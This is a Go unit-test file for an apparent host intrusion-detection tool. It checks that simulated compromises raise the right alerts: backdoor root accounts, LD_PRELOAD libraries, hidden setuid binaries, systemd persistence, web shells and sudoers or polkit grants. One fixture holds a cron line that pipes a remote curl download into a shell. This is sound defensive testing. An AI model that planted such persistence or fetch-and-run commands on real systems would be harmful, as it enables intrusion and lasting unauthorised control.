package analyze

import (
	"fmt"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/cpibia/tripwatch/internal/collector"
	"github.com/cpibia/tripwatch/internal/collector/apps"
	"github.com/cpibia/tripwatch/internal/collector/logs"
	"github.com/cpibia/tripwatch/internal/collector/system"
	"github.com/cpibia/tripwatch/internal/collector/web"
)

func fingerprints(fs []Finding) []string {
	var out []string
	for _, f := range fs {
		out = append(out, f.Severity+" "+f.Fingerprint)
	}
	slices.Sort(out)
	return out
}

func baseState() State {
	return State{
		Accounts:   &system.AccountsResult{Accounts: []system.Account{{Name: "root", UID: 0, Shell: "/bin/bash", Password: "set"}}},
		SSH:        &system.SSHResult{Settings: map[string]string{}, Keys: []system.AuthorizedKey{{User: "root", Fingerprint: "SHA256:old", Type: "ssh-ed25519"}}},
		Privileged: &system.PrivilegedResult{Files: []collector.File{{Path: "/usr/bin/passwd", Mode: "urwxr-xr-x", SHA256: "aa"}}},
		Apps:       &apps.Result{Apps: []apps.Profile{{Path: "/var/www/shop", Admins: []apps.Admin{{ID: "1", Name: "admin"}}}}},
	}
}

// A clean host raises nothing, on the first snapshot or after.
func TestCleanHost(t *testing.T) {
	cur := baseState()
	if f := Evaluate(nil, cur); len(f) != 0 {
		t.Errorf("first snapshot: %v", fingerprints(f))
	}
	prev := baseState()
	if f := Evaluate(&prev, cur); len(f) != 0 {
		t.Errorf("unchanged: %v", fingerprints(f))
	}
}

func TestCompromisedHost(t *testing.T) {
	prev := baseState()
	cur := baseState()
	cur.Accounts.Accounts = append(cur.Accounts.Accounts, system.Account{Name: "svcadmin", UID: 0, Shell: "/bin/bash", Password: "empty", Home: "/var/lib/svcadmin"})
	cur.SSH.Keys = append(cur.SSH.Keys, system.AuthorizedKey{User: "svcadmin", Fingerprint: "SHA256:new", Type: "ssh-ed25519", File: "/var/lib/svcadmin/.ssh/authorized_keys"})
	cur.Hooks = &system.HooksResult{Preload: []string{"/usr/lib/libhide.so"}}
	cur.Processes = &system.ProcessesResult{Processes: []system.Process{{PID: 4242, Comm: "[kworker/0:2]", Exe: "/var/www/.cache/x", ExeDeleted: true}}}
	cur.Privileged.Files = append(cur.Privileged.Files, collector.File{Path: "/usr/lib/.syslib/sh2", Mode: "urwxr-xr-x", SHA256: "bb"})
	cur.Services = &system.ServicesResult{Units: []system.Unit{{File: collector.File{Path: "/etc/systemd/system/sync.service"}, Exec: []string{"ExecStart=/var/www/.cache/sync/syncd"}}, {File: collector.File{Path: "/etc/systemd/system/empty.service"}, Exec: []string{"ExecStart="}}}}
	cur.Web = &web.Result{Apps: []web.AppReport{{Findings: []web.Finding{{Kind: web.KindScriptInUploads, File: collector.File{Path: "/var/www/shop/pub/media/x.php"}}, {Kind: web.KindEncodedBlob, File: collector.File{Path: "/var/www/shop/lib/fonts.php"}}}}}}
	cur.Weblog = &logs.Result{Events: []logs.Event{{Rule: "script_in_upload_path", Severity: "critical", Method: "POST", Status: 200, Log: "/var/log/nginx/access.log", Evidence: logs.AttackerControlled{Request: "/media/x.php"}}}}
	cur.Apps.Apps[0].Admins = append(cur.Apps.Apps[0].Admins, apps.Admin{ID: "9", Name: "support", Email: "x@example.invalid"})
	cur.Apps.Apps[0].Injected = []apps.Injected{{Where: "config design/footer", Domains: []string{"cdn.example.net"}}}

	got := fingerprints(Evaluate(&prev, cur))
	for _, want := range []string{
		"critical accounts:uid0:svcadmin",
		"high accounts:empty-password:svcadmin",
		"high accounts-change:new:svcadmin",
		"high ssh-change:key:svcadmin|SHA256:new",
		"critical persistence:preload:/usr/lib/libhide.so",
		"high processes:deleted:/var/www/.cache/x:",
		"critical privileged:setid:root|/usr/lib/.syslib/sh2",
		"high privileged-change:new:root|/usr/lib/.syslib/sh2:bb",
		"high persistence:unit-exec:root|/etc/systemd/system/sync.service:ExecStart=/var/www/.cache/sync/syncd",
		"critical web:script_in_upload_dir:/var/www/shop/pub/media/x.php",
		"critical weblog:script_in_upload_path:/media/x.php|/media/x.php/var/log/nginx/access.log",
		"critical apps-change:admin:/var/www/shop:9",
		"high apps:script:/var/www/shop:config design/footer:cdn.example.net",
	} {
		if !slices.Contains(got, want) {
			t.Errorf("missing %q", want)
		}
	}
	if slices.ContainsFunc(got, func(f string) bool { return strings.Contains(f, "fonts.php") }) {
		t.Error("an encoded blob alone must not raise an alert")
	}
}

// On the first snapshot, change rules stay quiet but state rules and log events fire.
func TestFirstSnapshot(t *testing.T) {
	cur := baseState()
	cur.Accounts.Accounts = append(cur.Accounts.Accounts, system.Account{Name: "svcadmin", UID: 0})
	cur.Weblog = &logs.Result{Events: []logs.Event{{Rule: "sensitive_file", Severity: "high", Evidence: logs.AttackerControlled{Request: "/.env"}}}}
	got := fingerprints(Evaluate(nil, cur))
	if !slices.Contains(got, "critical accounts:uid0:svcadmin") || !slices.ContainsFunc(got, func(f string) bool { return strings.Contains(f, "weblog:sensitive_file") }) {
		t.Errorf("findings = %v", got)
	}
	if slices.ContainsFunc(got, func(f string) bool { return strings.Contains(f, "-change:") }) {
		t.Errorf("change findings on a first snapshot: %v", got)
	}
}

// Comparing two large snapshots stays linear: 80,000 sudo rules, all different between the two,
// took 18 seconds with the list scans this replaced.
func TestEvaluateIsLinear(t *testing.T) {
	rules := func(prefix string) []string {
		out := make([]string, 80_000)
		for i := range out {
			out[i] = prefix + strconv.Itoa(i) + " ALL=(ALL) NOPASSWD: ALL"
		}
		return out
	}
	prev := State{Sudoers: &system.SudoersResult{Files: []system.SudoersFile{{Rules: rules("a")}}}}
	cur := State{Sudoers: &system.SudoersResult{Files: []system.SudoersFile{{Rules: rules("b")}}}}
	start := time.Now()
	findings := Evaluate(&prev, cur)
	if took := time.Since(start); took > 2*time.Second {
		t.Fatalf("Evaluate took %v", took)
	}
	// One alert for the changed file, its detail bounded.
	if len(findings) != 1 || strings.Count(findings[0].Detail, "\n") > 40 {
		t.Fatalf("%d findings", len(findings))
	}
}

func TestDroppedLogEventsRaiseAnAlert(t *testing.T) {
	cur := State{Weblog: &logs.Result{Stats: logs.Stats{
		DroppedEvents:  map[string]int{"critical": 3},
		DroppedSamples: []logs.Dropped{{Rule: "command_in_parameters", Severity: "critical", Path: "/x.php", IP: "203.0.113.9"}},
	}}}
	findings := Evaluate(nil, cur)
	if !slices.ContainsFunc(findings, func(f Finding) bool {
		return f.Severity == "high" && strings.Contains(f.Detail, "/x.php") && strings.Contains(f.Detail, "203.0.113.9")
	}) {
		t.Fatalf("findings = %+v", findings)
	}
}

// Two files at the same path differ in their alert's detail by size and hash.
func TestWebFindingDetailCarriesTheHash(t *testing.T) {
	finding := func(sum string, size int64) Finding {
		cur := State{Web: &web.Result{Apps: []web.AppReport{{Findings: []web.Finding{{Kind: web.KindHiddenInData, File: collector.File{Path: "/var/www/u/.x", SHA256: sum, Size: size}}}}}}}
		for _, f := range Evaluate(nil, cur) {
			if f.Kind == "web" {
				return f
			}
		}
		t.Fatal("no web finding")
		return Finding{}
	}
	decoy, genuine := finding("aaaa", 10), finding("bbbb", 4000)
	if decoy.Fingerprint != genuine.Fingerprint || decoy.Detail == genuine.Detail || !strings.Contains(genuine.Detail, "bbbb") {
		t.Fatalf("decoy %q, genuine %q", decoy.Detail, genuine.Detail)
	}
}

func findingOwners(fs []Finding) map[string]string {
	out := map[string]string{}
	for _, f := range fs {
		out[f.Fingerprint] = f.Owner
	}
	return out
}

// Owners come from where a finding was read, never from its kind alone.
func TestFindingOwners(t *testing.T) {
	gid6, uid33, uid0 := uint32(6), uint32(33), uint32(0)
	gid33 := uint32(33)
	cur := State{
		Accounts: &system.AccountsResult{Groups: []system.Group{{Name: "disk", GID: 6}, {Name: "www-data", GID: 33}}},
		Services: &system.ServicesResult{Units: []system.Unit{
			{File: collector.File{Path: "/var/www/.config/systemd/user/x.service"}, User: "0", Exec: []string{"ExecStart=/dev/shm/x"}},
			{File: collector.File{Path: "/etc/systemd/system/y.service"}, User: "0", Exec: []string{"ExecStart=/dev/shm/y"}},
		}, Environment: []string{
			"LD_PRELOAD=/dev/shm/a.so (var/www/.config/environment.d/x.conf)",
			"LD_PRELOAD=/dev/shm/b.so (etc/environment.d/50-x.conf)",
		}},
		Privileged: &system.PrivilegedResult{Files: []collector.File{
			{Path: "/srv/x/disk", Mode: "grwxr-xr-x", UID: &uid33, GID: &gid6},
			{Path: "/srv/x/mine", Mode: "urwxr-xr-x", UID: &uid33, GID: &uid33},
			{Path: "/srv/x/root", Mode: "urwxr-xr-x", UID: &uid0, GID: &uid0},
			{Path: "/srv/x/web", Mode: "grwxr-xr-x", UID: &uid33, GID: &gid33},
		}},
	}
	owners := findingOwners(Evaluate(nil, cur))
	for fp, want := range map[string]string{
		"persistence:default-env:home /var/www|LD_PRELOAD=/dev/shm/a.so (var/www/.config/environment.d/x.conf)": "home /var/www",
		"persistence:default-env:root|LD_PRELOAD=/dev/shm/b.so (etc/environment.d/50-x.conf)":                   "root",
		"privileged:setid:root|/srv/x/disk":   "root",
		"privileged:setid:uid 33|/srv/x/mine": "uid 33",
		"privileged:setid:root|/srv/x/root":   "root",
		"privileged:setid:uid 33|/srv/x/web":  "uid 33",
		"persistence:unit-exec:home /var/www|/var/www/.config/systemd/user/x.service:ExecStart=/dev/shm/x": "home /var/www",
		"persistence:unit-exec:root|/etc/systemd/system/y.service:ExecStart=/dev/shm/y":                    "root",
	} {
		if got, ok := owners[fp]; !ok || got != want {
			t.Errorf("%s: owner %q (present %v), want %q", fp, got, ok, want)
		}
	}

	// A key of a second account with UID 0 is root's.
	prev := State{SSH: &system.SSHResult{}}
	cur = State{
		Accounts: &system.AccountsResult{Accounts: []system.Account{{Name: "root", UID: 0}, {Name: "toor", UID: 0}, {Name: "www-data", UID: 33}}},
		SSH:      &system.SSHResult{Keys: []system.AuthorizedKey{{User: "toor", Fingerprint: "SHA256:t"}, {User: "www-data", Fingerprint: "SHA256:w"}}},
	}
	owners = findingOwners(Evaluate(&prev, cur))
	if owners["ssh-change:key:toor|SHA256:t"] != "root" || owners["ssh-change:key:www-data|SHA256:w"] != "www-data" {
		t.Errorf("key owners %v", owners)
	}
}

// A cron line seen before in one table is still new in another.
func TestCronLinesAreKnownPerTable(t *testing.T) {
	line := "* * * * * root curl -s http://x | sh"
	prev := State{Scheduled: &system.ScheduledResult{Tables: []system.CronTable{{File: collector.File{Path: "/var/spool/cron/crontabs/www-data"}, Entries: []string{line}}}}}
	cur := State{Scheduled: &system.ScheduledResult{Tables: []system.CronTable{
		{File: collector.File{Path: "/var/spool/cron/crontabs/www-data"}, Entries: []string{line}},
		{File: collector.File{Path: "/etc/cron.d/x"}, Entries: []string{line}},
	}}}
	owners := findingOwners(Evaluate(&prev, cur))
	if owners["persistence-change:cron:/etc/cron.d/x|"+line] != "root" {
		t.Fatalf("the line in root's table raised nothing: %v", owners)
	}
	if homeOwner("/root/.config/environment.d/x.conf") != "root" || homeOwner("/run/user/33/x") == "root" {
		t.Error("/root or /run/user owners")
	}
}

// An existing account made privileged by a standard command raises root's alert.
func TestExistingAccountPromoted(t *testing.T) {
	accounts := func(www system.Account, dockerMembers ...string) *system.AccountsResult {
		return &system.AccountsResult{
			Accounts: []system.Account{{Name: "root", UID: 0, GID: 0, Shell: "/bin/bash", Password: system.PasswordSet}, www},
			Groups:   []system.Group{{Name: "root", GID: 0}, {Name: "www-data", GID: 33}, {Name: "docker", GID: 999, Members: dockerMembers}},
		}
	}
	base := system.Account{Name: "www-data", UID: 33, GID: 33, Shell: "/usr/sbin/nologin", Password: system.PasswordLocked}
	prev := State{Accounts: accounts(base)}
	promoted := base
	promoted.GID, promoted.Shell, promoted.Password = 0, "/bin/bash", system.PasswordSet
	cur := State{Accounts: accounts(promoted, "www-data")}
	got := map[string]Finding{}
	for _, f := range Evaluate(&prev, cur) {
		got[f.Fingerprint] = f
	}
	for _, fp := range []string{
		"accounts-change:member:www-data|999",
		"accounts-change:member:www-data|0",
		"accounts-change:password:www-data|set",
		"accounts-change:shell:www-data|/bin/bash",
	} {
		if f, ok := got[fp]; !ok || f.Owner != "root" {
			t.Errorf("%s: %+v", fp, f)
		}
	}
	renumbered := base
	renumbered.UID = 0
	if _, ok := findingOwners(Evaluate(&prev, State{Accounts: accounts(renumbered)}))["accounts-change:uid:www-data|0"]; !ok {
		t.Error("UID change not reported")
	}
}

// Promotions that keep group names out of the fixed list: a group named in sudoers, a new name
// for docker's GID, a GID changed under the same name, membership only in gshadow, a shell
// copied under the name nologin.
func TestPromotionsByGID(t *testing.T) {
	www := system.Account{Name: "www-data", UID: 33, GID: 33, Shell: "/usr/sbin/nologin", Password: system.PasswordLocked}
	base := func(groups ...system.Group) State {
		return State{
			Accounts: &system.AccountsResult{Accounts: []system.Account{www}, Groups: append([]system.Group{{Name: "docker", GID: 999}, {Name: "deploy", GID: 1001}}, groups...)},
			Sudoers:  &system.SudoersResult{Files: []system.SudoersFile{{Rules: []string{"%deploy ALL=(ALL) NOPASSWD: ALL"}}}},
		}
	}
	critical := func(name string, prev, cur State, fp string) {
		t.Helper()
		for _, f := range Evaluate(&prev, cur) {
			if f.Fingerprint == fp && f.Severity == "critical" && f.Owner == "root" {
				return
			}
		}
		t.Errorf("%s: no critical %s", name, fp)
	}
	prev := base()
	sudo := base()
	sudo.Accounts.Groups[1].Members = []string{"www-data"}
	critical("member of a group sudoers names", prev, sudo, "accounts-change:member:www-data|1001")

	alias := base(system.Group{Name: "dockerx", GID: 999, Members: []string{"www-data"}})
	critical("new name for docker's GID", prev, alias, "accounts-change:member:www-data|999")

	inDeploy := base()
	inDeploy.Accounts.Groups[1].Members = []string{"www-data"}
	toRoot := base()
	toRoot.Accounts.Groups[1] = system.Group{Name: "deploy", GID: 0, Members: []string{"www-data"}}
	critical("group renumbered to 0", inDeploy, toRoot, "accounts-change:member:www-data|0")

	shadow := base()
	shadow.Accounts.Groups[0].ShadowMembers = []string{"www-data"}
	critical("member in gshadow only", prev, shadow, "accounts-change:member:www-data|999")

	copied := base()
	copied.Accounts.Accounts[0].Shell = "/var/lib/syslog/nologin"
	if _, ok := findingOwners(Evaluate(&prev, copied))["accounts-change:shell:www-data|/var/lib/syslog/nologin"]; !ok {
		t.Error("a shell copied under the name nologin was not seen")
	}
}

// A setuid file with UID 0 on a FUSE mount of the web user is that mount's, not root's.
func TestSetuidOnUserMount(t *testing.T) {
	uid0 := uint32(0)
	cur := State{Privileged: &system.PrivilegedResult{Files: []collector.File{
		{Path: "/var/www/m/x", Mode: "urwxr-xr-x", UID: &uid0, GID: &uid0, Mount: "fuse.sshfs uid 33"},
		{Path: "/var/tmp/r", Mode: "urwxr-xr-x", UID: &uid0, GID: &uid0},
	}}}
	owners := findingOwners(Evaluate(nil, cur))
	if owners["privileged:setid:mount fuse.sshfs uid 33|/var/www/m/x"] != "mount fuse.sshfs uid 33" || owners["privileged:setid:root|/var/tmp/r"] != "root" {
		t.Fatalf("owners %v", owners)
	}
}

// A new administrator of a privileged group, a polkit rule and a sudoers group written with
// escapes or another case are all root's alerts.
func TestDormantGrantsAndPolicies(t *testing.T) {
	groups := func(admins ...string) *system.AccountsResult {
		return &system.AccountsResult{Accounts: []system.Account{{Name: "www-data", UID: 33, GID: 33}},
			Groups: []system.Group{{Name: "docker", GID: 999, Admins: admins}, {Name: "deploy", GID: 1001}}}
	}
	prev := State{Accounts: groups(), Sudoers: &system.SudoersResult{}}
	cur := State{Accounts: groups("www-data"), Sudoers: &system.SudoersResult{Files: []system.SudoersFile{
		{File: collector.File{Path: "/etc/polkit-1/rules.d/49-web.rules"}, Rules: []string{"return polkit.Result.YES;"}},
	}}}
	got := map[string]Finding{}
	for _, f := range Evaluate(&prev, cur) {
		got[f.Fingerprint] = f
	}
	if f := got["accounts-change:group-admin:docker|www-data"]; f.Severity != "critical" || f.Owner != "root" {
		t.Errorf("group admin: %+v", f)
	}
	if f := got["persistence-change:policy:/etc/polkit-1/rules.d/49-web.rules|"]; f.Title != "Nuova politica polkit: /etc/polkit-1/rules.d/49-web.rules" || f.Owner != "root" {
		t.Errorf("polkit rule: %+v", f)
	}
	for _, rule := range []string{`%\x64eploy ALL=(ALL) ALL`, "%DEPLOY ALL=(ALL) ALL", "%:deploy ALL=(ALL) ALL"} {
		st := State{Accounts: groups(), Sudoers: &system.SudoersResult{Files: []system.SudoersFile{{Rules: []string{rule}}}}}
		if !privilegedGIDs(st)[1001] {
			t.Errorf("%q does not make deploy privileged", rule)
		}
	}
}

// Owners of many setgid files with many groups are decided in linear time.
func TestSetgidOwnersAreLinear(t *testing.T) {
	acc := &system.AccountsResult{Accounts: []system.Account{{Name: "www-data", UID: 33, GID: 33}}}
	var files []collector.File
	for i := range 4000 {
		acc.Groups = append(acc.Groups, system.Group{Name: fmt.Sprintf("g%d", i), GID: 2000 + i, Members: []string{"www-data"}})
		uid, gid := uint32(33), uint32(2000+i)
		files = append(files, collector.File{Path: fmt.Sprintf("/srv/f%d", i), Mode: "grwxr-xr-x", UID: &uid, GID: &gid})
	}
	start := time.Now()
	Evaluate(nil, State{Accounts: acc, Privileged: &system.PrivilegedResult{Files: files}})
	if took := time.Since(start); took > time.Second {
		t.Fatalf("Evaluate took %v", took)
	}
}

// A policy file changed without new lines (lines reused, a condition removed) or removed is
// still an alert, with the lines in its detail; groups granted by polkit and doas count.
func TestPolicyFileChanges(t *testing.T) {
	file := func(sum string, rules ...string) system.SudoersFile {
		return system.SudoersFile{File: collector.File{Path: "/etc/polkit-1/rules.d/50.rules", SHA256: sum}, Rules: rules}
	}
	prev := State{Sudoers: &system.SudoersResult{Files: []system.SudoersFile{file("a", "if (a) {", "if (subject.user == \"x\")", "return YES;", "}")}}}
	cur := State{Sudoers: &system.SudoersResult{Files: []system.SudoersFile{file("b", "if (a) {", "return YES;", "}")}}}
	fs := Evaluate(&prev, cur)
	if len(fs) != 1 || !strings.Contains(fs[0].Detail, `- if (subject.user == "x")`) || fs[0].Owner != "root" {
		t.Fatalf("condition removed: %+v", fs)
	}
	if fs := Evaluate(&prev, State{Sudoers: &system.SudoersResult{}}); len(fs) != 1 || !strings.Contains(fs[0].Title, "rimossa") {
		t.Fatalf("file removed: %+v", fs)
	}
	groups := &system.AccountsResult{Groups: []system.Group{{Name: "ops", GID: 1500}, {Name: "web", GID: 1600}, {Name: "doers", GID: 1700}}}
	st := State{Accounts: groups, Sudoers: &system.SudoersResult{Files: []system.SudoersFile{{Rules: []string{
		"Identity=unix-group:ops", `if (subject.isInGroup("web")) return polkit.Result.YES;`, "permit nopass :doers as root"}}}}}
	gids := privilegedGIDs(st)
	if !gids[1500] || !gids[1600] || !gids[1700] {
		t.Fatalf("policy groups: %v", gids)
	}
}

// Many groups and a rule naming many of them are resolved in linear time.
func TestPrivilegedGIDsAreLinear(t *testing.T) {
	acc := &system.AccountsResult{}
	var names []string
	for i := range 80_000 {
		acc.Groups = append(acc.Groups, system.Group{Name: fmt.Sprintf("g%d", i), GID: 2000 + i})
		names = append(names, fmt.Sprintf("%%g%d", i))
	}
	st := State{Accounts: acc, Sudoers: &system.SudoersResult{Files: []system.SudoersFile{{Rules: []string{strings.Join(names, ",") + " ALL=(ALL) ALL"}}}}}
	start := time.Now()
	if gids := privilegedGIDs(st); len(gids) != 80_001 {
		t.Fatalf("%d privileged GIDs", len(gids))
	}
	// Linear work takes well under a second (a few under the race detector); the per-name scan
	// this replaced took close to a minute.
	if took := time.Since(start); took > 10*time.Second {
		t.Fatalf("privilegedGIDs took %v", took)
	}
}

// A grant added after many harmless lines is shown first, and the cut is stated.
func TestRuleDiffShowsGrantsFirst(t *testing.T) {
	var cur []string
	for i := range 41 {
		cur = append(cur, fmt.Sprintf("Cmnd_Alias C%d = /bin/true", i))
	}
	cur = append(cur, "www-data ALL=(ALL) NOPASSWD: ALL")
	got := ruleDiff([]string{"deny www-data"}, cur)
	lines := strings.Split(got, "\n")
	if lines[0] != "+ www-data ALL=(ALL) NOPASSWD: ALL" || lines[1] != "- deny www-data" {
		t.Fatalf("grants not first:\n%s", got)
	}
	if len(lines) != maxDiffLines+1 || lines[maxDiffLines] != "(altre 3 righe aggiunte e 0 tolte non mostrate: il confronto completo è nella pagina dell'allarme)" {
		t.Fatalf("cut not stated:\n%s", got)
	}
}

// A policy file another account can write is critical; a change of owner or mode is root's alert.
func TestPolicyFileAccess(t *testing.T) {
	uid := func(v uint32) *uint32 { return &v }
	file := func(owner uint32, mode string) system.SudoersFile {
		return system.SudoersFile{File: collector.File{Path: "/etc/polkit-1/rules.d/50.rules", SHA256: "a", UID: uid(owner), GID: uid(0), Mode: mode}}
	}
	dir := collector.File{Path: "/etc/polkit-1/rules.d", UID: uid(0), GID: uid(0), Mode: "drwx------"}
	prev := State{Sudoers: &system.SudoersResult{Files: []system.SudoersFile{file(0, "-rw-r--r--")}, Dirs: []collector.File{dir}}}
	if fs := Evaluate(&prev, prev); len(fs) != 0 {
		t.Fatalf("root's policy raised: %+v", fs)
	}
	got := map[string]Finding{}
	for _, f := range Evaluate(&prev, State{Sudoers: &system.SudoersResult{Files: []system.SudoersFile{file(33, "-rw-r--r--")}, Dirs: []collector.File{dir}}}) {
		got[f.Fingerprint] = f
	}
	if f := got["persistence:policy-writable:/etc/polkit-1/rules.d/50.rules|proprietario 33, gruppo 0, modo -rw-r--r--"]; f.Severity != "critical" || f.Owner != "root" {
		t.Fatalf("writable policy: %+v", got)
	}
	if f := got["persistence-change:policy-access:/etc/polkit-1/rules.d/50.rules|proprietario 33, gruppo 0, modo -rw-r--r--"]; f.Severity != "high" || f.Owner != "root" {
		t.Fatalf("owner change: %+v", got)
	}
	wide := dir
	wide.Mode = "dtrwxrwxrwx"
	acl := dir
	acl.ACL, acl.ACLWrite = "0123456789abcdef", true
	none := policyTrust{}
	for _, f := range []collector.File{wide, acl, {Mode: "-rw-rw-r--", UID: uid(0), GID: uid(100)}, {Mode: "-rw-r--r--", UID: uid(0), Mount: "fuse uid 1000"}} {
		if !foreignWritable(f, none) {
			t.Errorf("not writable by others: %+v", f)
		}
	}
	if foreignWritable(collector.File{Mode: "-rw-rw-r--", UID: uid(0), GID: uid(0)}, none) {
		t.Error("root group counted as foreign")
	}
	readOnly := dir
	readOnly.ACL = "0123456789abcdef"
	if foreignWritable(readOnly, none) {
		t.Error("a read-only ACL counted as a writer")
	}

	// polkit's own account owns its rule directories on a standard install; elsewhere it is
	// an account like any other.
	accounts := &system.AccountsResult{Accounts: []system.Account{{Name: "polkitd", UID: 997, GID: 997, Shell: "/usr/sbin/nologin"}}, Groups: []system.Group{{Name: "polkitd", GID: 997}}}
	daemon := collector.File{Path: "/usr/share/polkit-1/rules.d", UID: uid(997), GID: uid(997), Mode: "drwx------"}
	st := State{Accounts: accounts, Sudoers: &system.SudoersResult{Dirs: []collector.File{daemon}}}
	if fs := Evaluate(nil, st); len(fs) != 0 {
		t.Fatalf("polkitd's directory raised: %+v", fs)
	}
	daemon.Path = "/etc/sudoers.d"
	if !foreignWritable(daemon, policyAccounts(accounts)) {
		t.Error("polkitd trusted outside polkit")
	}

	// The daemon's name on another account, its UID shared, or a member in its group, is not
	// the daemon.
	rulesDir := collector.File{Path: "/etc/polkit-1/rules.d", UID: uid(33), GID: uid(0), Mode: "drwx------"}
	shared := &system.AccountsResult{Accounts: []system.Account{{Name: "www-data", UID: 33, Shell: "/usr/sbin/nologin"}, {Name: "polkit", UID: 33, Shell: "/usr/sbin/nologin"}}}
	if !foreignWritable(rulesDir, policyAccounts(shared)) {
		t.Error("polkit sharing www-data's UID trusted")
	}
	group := collector.File{Path: "/etc/polkit-1/rules.d", UID: uid(0), GID: uid(997), Mode: "drwxrwx---"}
	if foreignWritable(group, policyAccounts(accounts)) {
		t.Error("polkitd's own group not trusted")
	}
	joined := &system.AccountsResult{Accounts: accounts.Accounts, Groups: []system.Group{{Name: "polkitd", GID: 997, Members: []string{"www-data"}}}}
	if !foreignWritable(group, policyAccounts(joined)) {
		t.Error("polkitd's group with www-data in it trusted")
	}

	// /usr/local of root:staff 2775 is root's while staff is empty, and makes staff privileged.
	local := collector.File{Path: "/usr/local", UID: uid(0), GID: uid(50), Mode: "dgrwxrwsr-x"}
	staff := &system.AccountsResult{Accounts: []system.Account{{Name: "root", UID: 0}}, Groups: []system.Group{{Name: "staff", GID: 50, Members: []string{"root"}}}}
	if foreignWritable(local, policyAccounts(staff)) {
		t.Error("empty staff group counted as foreign")
	}
	staff.Groups[0].Members = append(staff.Groups[0].Members, "alice")
	if !foreignWritable(local, policyAccounts(staff)) {
		t.Error("staff with alice in it trusted")
	}
	if gids := privilegedGIDs(State{Sudoers: &system.SudoersResult{Dirs: []collector.File{local}}}); !gids[50] {
		t.Error("a group that can write a policy directory is not privileged")
	}
}
